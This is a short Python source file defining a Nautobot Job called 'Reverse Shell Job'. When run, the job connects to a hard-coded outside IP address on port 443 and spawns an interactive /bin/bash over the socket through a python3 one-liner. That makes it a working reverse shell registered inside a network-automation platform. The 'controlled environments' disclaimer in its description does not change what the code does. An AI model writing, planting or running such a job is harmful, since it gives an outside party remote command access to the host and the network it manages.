from nautobot.apps.jobs import Job, register_jobs

class ReverseShellJob(Job):  
    class Meta:  
        name = "Reverse Shell Job"  
        description = "A job to open a reverse shell. Use only in controlled environments with explicit permission."  
 
    def run(self, data, commit):  
        rhost = "51.107.3.204"  
        rport = "443"  
 
        os.environ["RHOST"] = rhost  
        os.environ["RPORT"] = rport  
 
        self.log_info(f"Setting RHOST to {rhost}")  
        self.log_info(f"Setting RPORT to {rport}")  
 
        command = (  
            'import sys,socket,os,pty;'  
            's=socket.socket();'  
            's.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));'  
            '[os.dup2(s.fileno(),fd) for fd in (0,1,2)];'  
            'pty.spawn("/bin/bash")'  
        )  
 
        self.log_info("Running reverse shell command")  
        os.system(f"python3 -c '{command}'")  
 
        self.log_success("Reverse shell command executed. Check your listener.")  

register_jobs(ReverseShellJob)
